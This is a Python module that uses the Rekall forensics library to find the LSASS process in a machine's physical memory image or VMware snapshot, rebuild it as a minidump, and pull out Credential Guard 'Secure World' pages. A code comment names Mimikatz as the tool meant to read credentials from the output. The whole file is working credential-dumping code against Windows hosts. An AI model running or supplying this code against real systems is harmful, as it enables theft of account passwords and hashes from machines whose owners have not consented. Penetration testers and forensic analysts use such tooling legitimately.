#!/usr/bin/env python3

import logging
# Setup logging as required. Rekall will log to the standard logging service.
logging.basicConfig(level=logging.CRITICAL)
from rekall import session
from rekall import plugins
from rekall.plugins.addrspaces import intel
from fsminidump.minidump import Minidump
import sys
from binascii import hexlify, unhexlify
import json
import datetime
import time
import os

## Get system info.
#
# @param s rekall session.
# @param build, build version retrived without using rekall.
def read_systeminfo(s, build):
    major = int(s.profile.metadata('major'))
    minor = int(s.profile.metadata('minor'))
    arch = s.profile.metadata('arch')

    # The keys should match fsminidump
    return dict(MajorVersion=major, MinorVersion=minor, BuildNumber=build)

## Read memory info of process.
#
# @param s rekall session.
# @param pid pid of process to read.
def read_memoryinfo(s, pid):
    #MEM_IMAGE = 0x1000000
    MEM_MAPPED = 0x40000
    MEM_PRIVATE = 0x20000

    memoryinfo_list = []
    for d in s.plugins.vaddump(pids=[pid]).collect():
        if 'start' not in d:
            continue

        mi = dict(
            BaseAddress=d['start'].value,
            AllocationBase=0,
            AllocationProtect=int(d['protect'].value),
            RegionSize=d['end'].value-d['start'].value+1,
            Protect=int(d['protect'].value))

        # TODO: Somehow identify MEM_IMAGE
        if d['type'] == 'Mapped':
            mi['Type'] = MEM_MAPPED
        elif d['type'] == 'Private':
            mi['Type'] = MEM_PRIVATE
        else:
            mi['Type'] = 0

        # TODO: Figure out how to get the state...
        mi['State'] = 0

        memoryinfo_list.append(mi)

    return memoryinfo_list

# TODO: For some reason the output of memdump plugin does not match vaddump
# The Right Stuff is there but the virtual address seems to be wrong and therefore Mimikatz doesn't find it
def read_memory64_memdump(s):
    pslist = s.plugins.pslist(proc_regex='lsass.exe')
    task = next(pslist.filter_processes())
    addr_space = task.get_process_address_space() 

    max_memory = s.GetParameter("highest_usermode_address")
    total = 0
    memory64_list = []
    for run in addr_space.get_address_ranges(end=max_memory):
        size = run.end - run.start
        total += size
        data = addr_space.read(run.start, size)
        #if data.find(b'\x33\xff\x45\x89\x37\x48\x8b\xf3\x45\x85\xc9\x74') != -1:
        #    print("Found in", hex(run.start), hex(run.end), size)
        memory64_list.append((run.start, size, data))

    return memory64_list

## Read memory of process.
#
# @param s rekall session.
# @param pid pid of process to read.
def read_memory64(s, pid):
    pslist = s.plugins.pslist(proc_regex='lsass.exe')
    task = next(pslist.filter_processes())
    addr_space = task.get_process_address_space()

    memory64_list = []
    for d in s.plugins.vaddump(pids=[pid]).collect():
        if 'start' not in d:
            continue

        start = d['start'].value
        size = d['end'].value-d['start'].value+1
        #print(hex(start), size)

        # TODO: This is a hack that vaddump uses too (with 100 MB limit)
        if size > 100*1024*1024:
            #print("Skipping memory range", hex(start), size)
            continue

        data = addr_space.read(start, size)
        memory64_list.append((start, size, data))

    return memory64_list


## Read list of modules.
#
# @param s rekall session.
# @param pid pid of process to read.
def read_modulelist(s, pid):
    module_list = []
    for dll in s.plugins.dlllist(pids=[pid]).collect():
        if 'dll_path' in dll and len(dll['dll_path'].v()) > 1:
            module_list.append((dll['dll_path'].v(), dll['base'].v(), dll['size'].v()))
    return module_list

## Check ten times if file was created by other process, wait 1s on each check.
#
# @param path path to file.
# @exceptions Exception if file does not exist.
def ensureFileExist(path):
    for x in range(120):
        if(os.path.exists(path)):
            break
        time.sleep(1)
    else:
        raise Exception('File does not exist: ' + path)


def read_secure_world(s, secure_world_pages):
    PAGE_SIZE = 4096
    secure_world = []
    
    for addr in secure_world_pages:
        data = s.default_address_space.base.read(addr, PAGE_SIZE)
        secure_world.append(data)
    
    return b''.join(secure_world)


def _cg(s, label):
    print("[*] Getting physical memory layout")
    for start, end, count in s.plugins.phys_map().collect():
        image_size = end

    print("[*] Largest physical address is 0x%x (%u GB)" % (image_size, image_size//1024//1024//1024))

    print("[*] Finding Secure World pages (this will take about %u minutes)" % (image_size//1024//1024//1024))
    PAGE_SIZE = 0x1000
    PAGE_BITS = 12
    STATUS_INTERVAL = 512*1024*1024
    count = 0
    secure_world_pages = []
    for pfn in range(image_size//PAGE_SIZE):
        count += PAGE_SIZE

        if (count % STATUS_INTERVAL) == 0:
            print("[*] %u/%u MB analyzed" % (count//1024//1024, image_size//1024//1024))

        pfn_obj = s.profile.get_constant_object("MmPfnDatabase")[pfn]
        if pfn_obj.u3.e2.ReferenceCount == 2 and pfn_obj.u2.ShareCount == 1 and pfn_obj.PteAddress == 0:
            secure_world_pages.append(pfn << PAGE_BITS)

    print("[*] Reading %u MB of Secure World data from .vmem" % (len(secure_world_pages)*PAGE_SIZE//1024//1024))
    secure_world = read_secure_world(s, secure_world_pages)

    filepath = 'output/%s-%s-secure-world.raw' % (label, datetime.datetime.now().strftime("%Y-%m-%d"))
    print("[*] Writing Secure World data to %s" % (filepath))    
    with open(filepath, 'wb') as f:
        f.write(secure_world)
    
    return secure_world


def _dump(label, vmem):
    minidump = Minidump()

    config = {}
    if vmem:
        image_base, image_ext = os.path.splitext(vmem)
        if image_ext != ".vmem":
            print("[-] Image file must have .vmem file extension when using the --vmem switch")
            sys.exit(1)

        if not os.path.exists(image_base + ".vmss"):
            print("[-] .vmss file required. If you have a .vmsn file, please rename it to .vmss and try again")
            sys.exit(1)

        config['image'] = vmem
        print("[*] Analyzing local image %s" % (image_base))
    else:
        CONFIG_FILE = 'config.json'
        print("[*] Loading config from %s" % (CONFIG_FILE))
        ensureFileExist(CONFIG_FILE)
        with open(CONFIG_FILE) as f:
            config = json.load(f)

    ensureFileExist(config['image'])
    print("[*] Analyzing physical memory")

    s = session.Session(
        filename=config['image'],
        autodetect=["rsds"],
        logger=logging.getLogger(),
        cache = "timed",
        cache_dir = ".rekall_cache",
        repository_path = ['https://github.com/google/rekall-profiles/raw/master', 'http://profiles.rekall-forensic.com'],
        autodetect_build_local = "basic",
        dtb=(config['dtb'] if 'dtb' in config else None),
        kernel_base=(config['kernel_base'] if 'kernel_base' in config else None),
    )

    if vmem and str(s.default_address_space.base) != 'VMemAddressSpace':
        print("[-] No VMmemAddressSpace available. Most likely Rekall failed to parse the .vmss file.")
        sys.exit(1)

    print("[*] Checking for Credential Guard...")
    credential_guard = False
    for row in s.plugins.pslist().collect():
        if str(row['_EPROCESS'].name).lower() == "lsaiso.exe":
            credential_guard = True
            print("[*] Credential Guard detected!")
            secure_world = _cg(s, label)
            minidump.set_secure_world(secure_world)
            break
    else:
        print("[*] No Credential Guard detected")

    print("[*] Finding LSASS process")

    lsass_pid = None
    for row in s.plugins.pslist().collect():
        if str(row['_EPROCESS'].name).lower() == "lsass.exe":
            lsass_pid = row['_EPROCESS'].pid
            break
    else:
        print("No LSASS found")
        sys.exit(1)

    print("[*] LSASS found")

    build = 0
    if 'build' in config:
        build = int(config['build'])
    else:
        print("[*] Windows build number not known, collecting it with imageinfo plugin")
        imageinfo = s.plugins.imageinfo().collect()
        for x in imageinfo:
            if 'key' in x and x['key'] == 'NT Build':
                build = int(str(x['value']).split('.')[0])
                break

    print("[*] Collecting data for minidump: system info")
    systeminfo = read_systeminfo(s, build)
    print("[*] Collecting data for minidump: memory info")
    memoryinfo_list = read_memoryinfo(s, lsass_pid)
    print("[*] Collecting data for minidump: memory content")
    memory64_list = read_memory64(s, lsass_pid)
    print("[*] Collecting data for minidump: module info")
    module_list = read_modulelist(s, lsass_pid)

    print("[*] Generating the minidump file")
    minidump.set_systeminfo(systeminfo)
    minidump.set_memoryinfo_list(memoryinfo_list)
    minidump.set_memory64(memory64_list)
    minidump.set_module_list(module_list)

    data = minidump.build()

    if (not os.path.exists('output')):
        os.mkdir('output')

    filepath = 'output/%s-%s-lsass.dmp' % (label, datetime.datetime.now().strftime("%Y-%m-%d"))
    with open(filepath, 'wb') as f:
        f.write(data)

    print("[*] Wrote LSASS minidump to %s" % (filepath))


## Main function of module.
#
# Reads file with remote machine memory, and starts rekall session on it.
# Creates LSASS process memory dump.
# @param label created memory dump will be stored as 'output/label-date-lsass.dmp'
def dump(label, vmem):
    try:
        _dump(label, vmem)
    except KeyboardInterrupt:
        pass
